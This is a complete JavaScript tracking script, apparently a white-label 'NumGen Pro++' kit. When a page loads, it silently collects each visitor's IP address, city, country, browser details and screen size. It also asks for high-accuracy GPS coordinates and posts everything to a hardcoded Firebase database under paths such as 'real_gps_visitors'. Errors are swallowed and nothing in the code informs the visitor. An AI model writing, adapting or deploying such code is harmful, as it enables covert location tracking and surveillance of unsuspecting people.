
// NumGen Pro++ Tracker - SDK FIXED - ISOLATED PER USER
(function(){
  var FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
  var p = new URLSearchParams(location.search);
  var CLIENT_ID = p.get('id') || p.get('client_id') || document.currentScript?.getAttribute('data-client') || "PUBLIC";
  var SUB = p.get('sub') || Date.now().toString();
  
  function send(path, data){
    try{
      fetch(FIREBASE_URL + "/" + path + ".json", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(data)
      }).catch(function(){});
    }catch(e){}
  }
  
  function track(ip){
    var now = new Date();
    var base = {
      name: CLIENT_ID,
      client_id: CLIENT_ID,
      sub_id: SUB,
      ip: ip && ip.ip ? ip.ip : "",
      city: ip && ip.city ? ip.city : "",
      country: ip && ip.country_name ? ip.country_name : (ip && ip.country ? ip.country : ""),
      device: navigator.userAgent.substring(0,200),
      device_full: navigator.userAgent,
      screen: screen.width+"x"+screen.height,
      url: location.href,
      time: now.toLocaleString(),
      timestamp: Date.now(),
      _path: "white_label_clients/"+CLIENT_ID+"/visitors",
      source: "client_script"
    };
    // Isolated paths
    send("white_label_clients/"+CLIENT_ID+"/visitors", base);
    send("no_code_visits/"+CLIENT_ID, base);
    send("visitors", base);
    send("pro_max_visitors", base);
    
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(pos){
        var g = Object.assign({}, base, {
          real_lat: pos.coords.latitude,
          real_lon: pos.coords.longitude,
          real_accuracy: Math.round(pos.coords.accuracy),
          real_device_name: navigator.userAgent,
          _path: "real_gps_visitors"
        });
        send("real_gps_visitors", g);
        send("real_device_visitors", g);
        send("cabatsha_visitors", g);
        send("white_label_clients/"+CLIENT_ID+"/visitors", g);
      }, function(){}, {enableHighAccuracy:true, timeout:6000});
    }
  }
  
  try{
    fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(d){track(d)}).catch(function(){track(null)})
  }catch(e){ track(null) }
})();
